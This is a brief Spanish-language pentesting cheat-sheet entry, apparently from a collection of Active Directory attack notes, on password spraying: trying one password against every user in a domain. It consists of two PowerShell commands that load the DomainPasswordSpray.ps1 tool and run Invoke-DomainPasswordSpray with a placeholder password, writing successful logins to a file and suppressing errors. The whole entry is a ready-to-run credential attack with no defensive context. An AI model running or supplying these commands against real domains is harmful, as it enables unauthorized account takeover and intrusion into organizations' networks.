### Password Spraying - Fuerza bruta usando una contraseña en particular a todos los usuarios del dominio:
$ import-module .\DomainPasswordSpray.ps1
$ Invoke-DomainPasswordSpray -Password {PASSWORD} -OutFile spray_success -ErrorAction SilentlyContinue